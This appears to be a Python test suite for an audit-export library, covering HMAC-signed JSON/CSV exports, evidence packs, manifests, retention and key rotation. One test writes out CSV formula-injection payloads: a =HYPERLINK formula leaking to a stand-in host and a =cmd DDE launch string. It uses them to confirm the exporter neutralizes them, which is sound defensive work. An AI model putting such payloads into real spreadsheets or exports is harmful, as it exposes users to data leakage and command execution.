"""Export verification tests: signature-bearing exports, streaming, evidence
packs, manifests, and retention."""
from __future__ import annotations

import csv
import hashlib
import io
import json
import sqlite3
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from aistamp.audit import (
    AuditExporter,
    build_evidence_pack,
    build_export_manifest,
    enforce_retention,
    record_to_dict,
    sanitize_csv_cell,
    signature_verdict,
)
from aistamp.config import Config
from aistamp.fingerprint import generate_content_id, hash_content, sign_record
from aistamp.models import (
    PIIMatch,
    PIIResult,
    PIISeverity,
    PolicyAction,
    PolicyDecision,
    ProvenanceRecord,
    QueryFilters,
    RecordStatus,
)
from aistamp.store import SQLiteBackend

_SECRET = "test-secret-key-for-aistamp-unit-tests-32chars"


def _sample_record() -> ProvenanceRecord:
    """A minimal signed-ready record with one EMAIL PII hit."""
    return ProvenanceRecord(
        content_id=generate_content_id(),
        app_id="export_app",
        feature_id="export_feature",
        user_id="export_user",
        model="gpt-4o",
        prompt_hash=hash_content("prompt"),
        response_hash=hash_content("response"),
        prompt_tokens=5,
        response_tokens=6,
        latency_ms=10.0,
        timestamp=datetime.now(timezone.utc),
        status=RecordStatus.COMPLETED,
        pii_result=PIIResult(
            prompt_matches=[
                PIIMatch(
                    pattern_name="EMAIL",
                    severity=PIISeverity.MEDIUM,
                    start=0,
                    end=18,
                    redacted_snippet="[REDACTED]",
                )
            ],
            response_matches=[],
            highest_severity=PIISeverity.MEDIUM,
            match_count=1,
        ),
        policy_decision=PolicyDecision(
            action=PolicyAction.WARN,
            rule_name="r",
            reason="because",
        ),
    )


def _write_signed(
    backend: SQLiteBackend,
    record: ProvenanceRecord,
    secret: str = _SECRET,
) -> str:
    hmac_sig = sign_record(record, secret)
    backend.write(record, hmac_sig)
    return hmac_sig


def _file_backend(tmp_path: Path) -> SQLiteBackend:
    backend = SQLiteBackend(f"sqlite:///{tmp_path / 'audit.db'}")
    backend.create_tables()
    return backend


def _all_filters() -> QueryFilters:
    return QueryFilters(limit=100, offset=0)


# ---------------------------------------------------------------------------
# JSON / CSV exports carry signatures that re-verify
# ---------------------------------------------------------------------------


def test_to_json_carries_signature_and_valid_verdict(
    signed_record_in_store: dict,
    sqlite_backend: SQLiteBackend,
) -> None:
    exporter = AuditExporter(sqlite_backend, secret_key=_SECRET)
    report = exporter.query(_all_filters())
    data = json.loads(exporter.to_json(report))

    assert data["records"][0]["hmac_signature"] == signed_record_in_store["hmac"]
    assert data["records"][0]["signature_verdict"] == "VALID"


def test_to_csv_carries_signature_and_verdict(
    signed_record_in_store: dict,
    sqlite_backend: SQLiteBackend,
) -> None:
    exporter = AuditExporter(sqlite_backend, secret_key=_SECRET)
    report = exporter.query(_all_filters())
    rows = list(csv.DictReader(io.StringIO(exporter.to_csv(report))))

    assert len(rows) == 1
    assert rows[0]["hmac_signature"] == signed_record_in_store["hmac"]
    assert rows[0]["signature_verdict"] == "VALID"


def test_to_csv_has_per_pii_type_breakdown_columns(
    signed_record_in_store: dict,
    sqlite_backend: SQLiteBackend,
) -> None:
    exporter = AuditExporter(sqlite_backend, secret_key=_SECRET)
    report = exporter.query(_all_filters())
    rows = list(csv.DictReader(io.StringIO(exporter.to_csv(report))))

    # The sample record carries one EMAIL match.
    assert rows[0]["pii_email"] == "1"
    assert rows[0]["pii_ssn"] == "0"
    assert rows[0]["pii_other"] == "0"


def test_tampered_record_exports_as_invalid(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    record = _sample_record()
    stored = _write_signed(backend, record)

    # Tamper directly in the DB, bypassing the API.
    db_path = tmp_path / "audit.db"
    with sqlite3.connect(db_path) as conn:
        conn.execute(
            "UPDATE provenance_records SET model = 'tampered-model' "
            "WHERE content_id = ?",
            (record.content_id,),
        )

    exporter = AuditExporter(backend, secret_key=_SECRET)
    report = exporter.query(_all_filters())
    data = json.loads(exporter.to_json(report))
    assert data["records"][0]["hmac_signature"] == stored
    assert data["records"][0]["signature_verdict"] == "INVALID"


def test_unsigned_record_exports_as_missing(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    record = _sample_record()
    backend.write(record, None)

    exporter = AuditExporter(backend, secret_key=_SECRET)
    report = exporter.query(_all_filters())
    data = json.loads(exporter.to_json(report))
    assert data["records"][0]["hmac_signature"] is None
    assert data["records"][0]["signature_verdict"] == "MISSING"


def test_unverifiable_without_secret_key(
    signed_record_in_store: dict,
    sqlite_backend: SQLiteBackend,
) -> None:
    exporter = AuditExporter(sqlite_backend)
    report = exporter.query(_all_filters())
    data = json.loads(exporter.to_json(report))
    assert data["records"][0]["signature_verdict"] == "UNVERIFIED"


def test_wrong_secret_reads_invalid(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    record = _sample_record()
    _write_signed(backend, record, secret=_SECRET)

    exporter = AuditExporter(backend, secret_key="a-different-secret-key-32-chars!!")
    report = exporter.query(_all_filters())
    data = json.loads(exporter.to_json(report))
    assert data["records"][0]["signature_verdict"] == "INVALID"


# ---------------------------------------------------------------------------
# Streaming
# ---------------------------------------------------------------------------


def test_iter_records_streams_lazily(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    for i in range(3):
        record = _sample_record().model_copy(update={"user_id": f"u{i}"})
        _write_signed(backend, record)

    exporter = AuditExporter(backend, secret_key=_SECRET)
    stream = exporter.iter_records(_all_filters())
    first = next(iter(stream))
    assert first.user_id == "u0"
    assert len(list(exporter.iter_records(_all_filters()))) == 3


def test_to_json_file_matches_in_memory_output(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    _write_signed(backend, _sample_record())

    exporter = AuditExporter(backend, secret_key=_SECRET)
    report = exporter.query(_all_filters())
    in_memory = exporter.to_json(report)

    out = tmp_path / "export.json"
    with out.open("w") as fp:
        exporter.to_json_file(fp, _all_filters())
    # generated_at is stamped per call — compare payload equality instead of
    # byte equality.
    file_data = json.loads(out.read_text())
    memory_data = json.loads(in_memory)
    file_data.pop("generated_at")
    memory_data.pop("generated_at")
    assert file_data == memory_data
    assert file_data["records"][0]["signature_verdict"] == "VALID"


def test_to_csv_file_matches_in_memory_output(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    _write_signed(backend, _sample_record())

    exporter = AuditExporter(backend, secret_key=_SECRET)
    report = exporter.query(_all_filters())
    in_memory = exporter.to_csv(report)

    out = tmp_path / "export.csv"
    with out.open("w") as fp:
        written = exporter.to_csv_file(fp, _all_filters())
    assert written == 1
    file_rows = list(csv.DictReader(io.StringIO(out.read_text())))
    memory_rows = list(csv.DictReader(io.StringIO(in_memory)))
    assert file_rows == memory_rows
    assert file_rows[0]["signature_verdict"] == "VALID"


# ---------------------------------------------------------------------------
# record_to_dict (public) and audit-JSON parity
# ---------------------------------------------------------------------------


def test_record_to_dict_is_public_and_matches_exporter(
    signed_record_in_store: dict,
    sqlite_backend: SQLiteBackend,
) -> None:
    record = signed_record_in_store["record"]
    d = record_to_dict(record)
    assert d["content_id"] == record.content_id

    exporter = AuditExporter(sqlite_backend, secret_key=_SECRET)
    signed = exporter.signed_record_dict(record, signed_record_in_store["hmac"])
    assert signed["hmac_signature"] == signed_record_in_store["hmac"]
    assert signed["signature_verdict"] == "VALID"
    assert signed["pii_type_counts"] == {"EMAIL": 1}


# ---------------------------------------------------------------------------
# Evidence packs
# ---------------------------------------------------------------------------


def test_evidence_pack_is_complete_and_verifiable(
    signed_record_in_store: dict,
    sqlite_backend: SQLiteBackend,
    sample_provenance_record: ProvenanceRecord,
) -> None:
    exporter = AuditExporter(sqlite_backend, secret_key=_SECRET)
    pack = exporter.evidence_pack(sample_provenance_record.content_id)

    assert pack["evidence_version"] == 1
    assert pack["content_id"] == sample_provenance_record.content_id
    assert pack["record"]["content_id"] == sample_provenance_record.content_id
    assert pack["hmac_signature"] == signed_record_in_store["hmac"]
    assert pack["verification"]["signature_verdict"] == "VALID"
    assert pack["pii_detail"]["match_count"] == 1
    assert pack["pii_detail"]["type_counts"] == {"EMAIL": 1}
    assert pack["policy_trace"] is not None
    assert pack["policy_trace"]["action"] == "WARN"

    # Independent re-verification: the write-time signing API reproduces the
    # signature carried in the pack.
    assert (
        sign_record(sample_provenance_record, _SECRET)
        == pack["hmac_signature"]
    )


def test_evidence_pack_unknown_id_raises(
    sqlite_backend: SQLiteBackend,
) -> None:
    from aistamp.fingerprint import RecordNotFoundError

    exporter = AuditExporter(sqlite_backend, secret_key=_SECRET)
    with pytest.raises(RecordNotFoundError):
        exporter.evidence_pack("no-such-content-id")


# ---------------------------------------------------------------------------
# Export manifest
# ---------------------------------------------------------------------------


def test_manifest_records_file_digests_and_version(tmp_path: Path) -> None:
    patterns = tmp_path / "patterns.yaml"
    patterns.write_text("patterns: []\n")
    policy = tmp_path / "policy.yaml"
    policy.write_text("rules: []\n")

    manifest = build_export_manifest(pattern_files=[patterns], policy_file=policy)
    data = manifest.to_dict()

    assert data["aistamp_version"]
    assert data["manifest_version"] == 1
    assert len(data["pattern_files"]) == 1
    assert data["pattern_files"][0]["path"].endswith("patterns.yaml")
    assert (
        data["pattern_files"][0]["sha256"]
        == hashlib.sha256(patterns.read_bytes()).hexdigest()
    )
    assert (
        data["policy_file"]["sha256"]
        == hashlib.sha256(policy.read_bytes()).hexdigest()
    )


def test_manifest_digest_changes_when_file_changes(tmp_path: Path) -> None:
    policy = tmp_path / "policy.yaml"
    policy.write_text("rules: []\n")
    before = build_export_manifest(policy_file=policy).to_dict()
    policy.write_text("rules:\n  - name: new\n    action: ALLOW\n")
    after = build_export_manifest(policy_file=policy).to_dict()

    assert before["policy_file"]["sha256"] != after["policy_file"]["sha256"]


# ---------------------------------------------------------------------------
# Retention
# ---------------------------------------------------------------------------


def test_retention_dry_run_then_delete(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    old_ts = datetime.now(timezone.utc) - timedelta(days=100)
    for i in range(2):
        record = _sample_record().model_copy(
            update={"user_id": f"u{i}", "timestamp": old_ts}
        )
        _write_signed(backend, record)

    db_url = f"sqlite:///{tmp_path / 'audit.db'}"
    assert enforce_retention(db_url, older_than_days=90, dry_run=True) == 2
    assert enforce_retention(db_url, older_than_days=90, dry_run=False) == 2
    assert enforce_retention(db_url, older_than_days=90, dry_run=True) == 0
    assert len(list(backend.query(_all_filters()).records)) == 0


def test_retention_scopes_to_app_id(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    old_ts = datetime.now(timezone.utc) - timedelta(days=100)
    for app in ("keep_app", "purge_app"):
        record = _sample_record().model_copy(
            update={"app_id": app, "timestamp": old_ts}
        )
        _write_signed(backend, record)

    db_url = f"sqlite:///{tmp_path / 'audit.db'}"
    deleted = enforce_retention(
        db_url, older_than_days=90, app_id="purge_app", dry_run=False
    )
    assert deleted == 1
    remaining = backend.query(_all_filters())
    assert remaining.total_count == 1
    assert remaining.records[0].app_id == "keep_app"


def test_retention_rejects_nonpositive_window(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="older_than_days"):
        enforce_retention(
            f"sqlite:///{tmp_path / 'audit.db'}", older_than_days=0
        )


def test_retention_accepts_config_database_url(tmp_path: Path) -> None:
    # The CLI passes config.database_url through the same helper; smoke-test
    # that path with a Config-built URL.
    config = Config(
        secret_key=_SECRET,
        database_url=f"sqlite:///{tmp_path / 'audit.db'}",
    )
    backend = SQLiteBackend(config.database_url)
    backend.create_tables()
    old_ts = datetime.now(timezone.utc) - timedelta(days=100)
    _write_signed(
        backend,
        _sample_record().model_copy(update={"timestamp": old_ts}),
    )

    assert (
        enforce_retention(
            config.database_url, older_than_days=90, dry_run=True
        )
        == 1
    )


# ---------------------------------------------------------------------------
# CSV formula injection (audit P1-7): caller-controlled fields are neutralized
# ---------------------------------------------------------------------------


def test_csv_neutralizes_formula_injection(tmp_path: Path) -> None:
    # The audit's PoV payloads: =HYPERLINK exfil and =cmd DDE launch in
    # caller-controlled user_id/app_id fields.
    backend = _file_backend(tmp_path)
    record = _sample_record().model_copy(
        update={
            "user_id": '=HYPERLINK("http://evil.example/leak","click")',
            "app_id": "=cmd|' /C calc'!A0",
        }
    )
    _write_signed(backend, record)
    exporter = AuditExporter(backend, secret_key=_SECRET)
    csv_out = exporter.to_csv(exporter.query(_all_filters()))

    rows = list(csv.reader(io.StringIO(csv_out)))
    cells = dict(zip(rows[0], rows[1], strict=True))
    assert cells["user_id"].startswith("'=HYPERLINK")
    assert cells["app_id"].startswith("'=cmd")
    # The raw payload must not survive as a leading formula character.
    assert not cells["user_id"].startswith("=")
    assert not cells["app_id"].startswith("=")


def test_sanitize_csv_cell_covers_owasp_lead_characters() -> None:
    assert sanitize_csv_cell("=SUM(A1)") == "'=SUM(A1)"
    assert sanitize_csv_cell("+1(555)0100") == "'+1(555)0100"
    assert sanitize_csv_cell("-2nd floor") == "'-2nd floor"
    assert sanitize_csv_cell("@handle") == "'@handle"
    assert sanitize_csv_cell("\tcmd") == "'\tcmd"
    assert sanitize_csv_cell("\r\ninject") == "'\r\ninject"
    assert sanitize_csv_cell("safe_user") == "safe_user"
    assert sanitize_csv_cell("") == ""


def test_csv_preserves_numeric_cells(tmp_path: Path) -> None:
    # Only string cells are neutralized; numbers keep their native
    # formatting (a negative latency must not grow an apostrophe).
    backend = _file_backend(tmp_path)
    record = _sample_record().model_copy(update={"latency_ms": -1.5})
    _write_signed(backend, record)
    exporter = AuditExporter(backend, secret_key=_SECRET)
    csv_out = exporter.to_csv(exporter.query(_all_filters()))

    lines = csv_out.splitlines()
    header = next(csv.reader(io.StringIO(lines[0])))
    values = next(csv.reader(io.StringIO(lines[1])))
    cells = dict(zip(header, values, strict=True))
    assert cells["latency_ms"] == "-1.5"


# ---------------------------------------------------------------------------
# Keyring-aware verdicts (audit P2-12, promoted P1): rotated history must not
# report INVALID
# ---------------------------------------------------------------------------


_ROTATED_KEY_ID = "k-2024-09"
_OLD_KEY = "retired-signing-key-for-rotation-tests-32ch"


def _rotated_record() -> ProvenanceRecord:
    """A record signed under a retired key (rotation without re-signing).

    ProvenanceRecord gains ``key_id`` with the tamper-evidence track; until
    then model_copy carries the value the way rotate_secret's re-sign does.
    """
    return _sample_record().model_copy(update={"key_id": _ROTATED_KEY_ID})


def test_rotated_history_without_keyring_reports_unverified(
    tmp_path: Path,
) -> None:
    # Regression: this used to report INVALID — legitimately signed history
    # crying wolf after a rotation masks real tampering. Keyed record stays
    # in memory: the store round-trip cannot carry key_id until the
    # tamper-evidence track lands the column.
    record = _rotated_record()
    stored = sign_record(record, _OLD_KEY)

    verdict = signature_verdict(record, stored, _SECRET)
    assert verdict == "UNVERIFIED"


def test_rotated_history_with_keyring_reports_valid(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    record = _rotated_record()
    stored = _write_signed(backend, record, secret=_OLD_KEY)
    exporter = AuditExporter(
        backend,
        secret_key=_SECRET,
        verification_keyring={_ROTATED_KEY_ID: _OLD_KEY, "default": _SECRET},
    )

    # Keyed record, keyring lookup by key_id hits the retired key.
    enriched = exporter.signed_record_dict(record, stored)
    assert enriched["signature_verdict"] == "VALID"


def test_legacy_pre_rotation_history_verifies_via_keyring(tmp_path: Path) -> None:
    # 0.1.x-era records (implicit default key id) signed with the
    # pre-rotation secret round-trip through the store and verify via the
    # keyring entry mounted at 'default', while the active key has rotated.
    backend = _file_backend(tmp_path)
    legacy = _sample_record()
    _write_signed(backend, legacy, secret=_OLD_KEY)
    exporter = AuditExporter(
        backend,
        secret_key=_SECRET,
        verification_keyring={"default": _OLD_KEY},
    )

    payload = json.loads(exporter.to_json(exporter.query(_all_filters())))
    verdicts = {
        r["content_id"]: r["signature_verdict"] for r in payload["records"]
    }
    assert verdicts[legacy.content_id] == "VALID"


def test_keyring_missing_key_reports_unverified(tmp_path: Path) -> None:
    backend = _file_backend(tmp_path)
    record = _rotated_record()
    stored = _write_signed(backend, record, secret=_OLD_KEY)
    exporter = AuditExporter(
        backend, secret_key=_SECRET, verification_keyring={"default": _SECRET}
    )

    assert exporter._verdict(record, stored) == "UNVERIFIED"


def test_keyring_still_detects_tampering(tmp_path: Path) -> None:
    # A keyring must not turn real tampering into UNVERIFIED.
    backend = _file_backend(tmp_path)
    record = _rotated_record()
    _write_signed(backend, record, secret=_OLD_KEY)
    exporter = AuditExporter(
        backend,
        secret_key=_SECRET,
        verification_keyring={_ROTATED_KEY_ID: _OLD_KEY},
    )

    assert exporter._verdict(record, "0" * 64) == "INVALID"


def test_default_key_id_verdicts_unchanged(tmp_path: Path) -> None:
    # 0.1.x records (no key_id) keep today's behavior under a keyring.
    backend = _file_backend(tmp_path)
    record = _sample_record()
    stored = _write_signed(backend, record)
    exporter = AuditExporter(
        backend, secret_key=_SECRET, verification_keyring={"default": _SECRET}
    )

    assert exporter._verdict(record, stored) == "VALID"
    assert exporter._verdict(record, "f" * 64) == "INVALID"


def test_evidence_pack_uses_keyring_and_record_sig_algo() -> None:
    record = _rotated_record()
    stored = sign_record(record, _OLD_KEY)

    pack = build_evidence_pack(
        record,
        stored,
        _SECRET,
        keyring={_ROTATED_KEY_ID: _OLD_KEY, "default": _SECRET},
    )
    assert pack["verification"]["signature_verdict"] == "VALID"
    assert pack["verification"]["algorithm"] == "HMAC-SHA256"

    # Without the keyring the pack must say UNVERIFIED, never INVALID.
    unverified = build_evidence_pack(record, stored, _SECRET)
    assert unverified["verification"]["signature_verdict"] == "UNVERIFIED"
